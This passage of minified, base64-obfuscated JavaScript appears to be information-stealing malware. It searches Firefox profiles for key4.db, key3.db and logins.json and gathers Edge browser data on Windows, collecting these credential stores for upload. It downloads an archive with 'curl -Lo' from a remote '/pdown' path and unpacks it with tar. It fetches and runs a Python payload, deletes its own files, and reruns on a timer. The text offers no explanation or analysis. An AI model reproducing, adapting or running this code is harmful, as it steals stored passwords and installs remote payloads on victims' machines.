c=`${r}/ld_${n}`;m(c)?t.push({[V]:a[$](c),[w]:{[W]:`plld_${n}`}}):a[l](h,c,(t=>{let c=[{[V]:a[$](h),[w]:{[W]:`plld_${n}`}}];C(c)}))}catch(t){}}}catch(t){}return C(t),t},D=async()=>{let t=[];const c=n(Q),$=n("a2V5NC5kYg"),l=n("a2V5My5kYg"),r=n("bG9naW5zLmpzb24");try{let h="";if(h=`${hd}${n("Ly5tb3ppbGxhL2ZpcmVmb3gv")}`,h&&""!==h&&m(h))for(let n=0;n<200;n++){const s=0===n?b:`${p} ${n}`,e=`${h}/${s}/${$}`,Z=`${h}/${s}/${l}`,o=`${h}/${s}/${r}`;try{m(e)&&t.push({[V]:a[c](e),[w]:{[W]:`flk4_${n}`}})}catch(t){}try{m(Z)&&t.push({[V]:a[c](Z),[w]:{[W]:`flk3_${n}`}})}catch(t){}try{m(o)&&t.push({[V]:a[c](o),[w]:{[W]:`fllj_${n}`}})}catch(t){}}}catch(t){}return C(t),t},P=n("cm1TeW5j"),O="XC5weXBccHl0aG9uLmV4ZQ",K=51476590;let tt=0;const ct=async t=>{const c=`${n("dGFyIC14Zg")} ${t} -C ${hd}`;ex(c,((c,$,l)=>{if(c)return a[P](t),void(tt=0);a[P](t),lt()}))},at=()=>{const t=n("cDIuemlw"),c=`${h()}${n("L3Bkb3du")}`,$=`${td}\\${n("cC56aQ")}`,l=`${td}\\${t}`;if(tt>=K+6)return;const r=n("cmVuYW1lU3luYw"),s=n("cmVuYW1l");if(a[G]($))try{var e=a[j]($);e.size>=K+6?(tt=e.size,a[s]($,l,(t=>{if(t)throw t;ct(l)}))):(tt<e.size?tt=e.size:(a[P]($),tt=0),$t())}catch(t){}else{const t=`${n("Y3VybCAtTG8")} "${$}" "${c}"`;ex(t,((t,c,n)=>{if(t)return tt=0,void $t();try{tt=K+6,a[r]($,l),ct(l)}catch(t){}}))}};function $t(){setTimeout((()=>{at()}),2e4)}const lt=async()=>await new Promise(((t,c)=>{if("w"==pl[0]){const t=`${hd}${n(O)}`;a[G](`${t}`)?(()=>{const t=h(),c=n(u),$=n(Z),l=n(d),r=n(o),s=`${t}${c}/${e}`,G=`${hd}${r}`,y=`"${hd}${n(O)}" "${G}"`;try{a[P](G)}catch(t){}rq[$](s,((t,c,$)=>{if(!t)try{a[l](G,$),ex(y,((t,c,a)=>{}))}catch(t){}}))})():at()}else(()=>{const t=h(),c=n(u),$=n(d),l=n(Z),r=n(o),s=n("cHl0aG9u"),G=`${t}${c}/${e}`,y=`${hd}${r}`;let i=`${s}3 "${y}"`;rq[l](G,((t,c,l)=>{t||(a[$](y,l),ex(i,((t,c,a)=>{})))}))})()}));var rt=0;const nt=async()=>{try{r=Date.now(),await(async()=>{g=hs;try{const t=s("~/");await A(B,0),await A(F,1),await A(U,2),"w"==pl[0]?(pa=`${t}${n(x)}${n("TG9jYWwvTWljcm9zb2Z0L0VkZ2U")}${n(N)}`,await T(pa,"3_",!1)):"d"==pl[0]?(await E(),await H(),await S()):"l"==pl[0]&&(await M(),await I(),await D())}catch(t){}})(),lt()}catch(t){}};nt();let ht=setInterval((()=>{(rt+=1)<5?nt():clearInterval(ht)}),6e5);
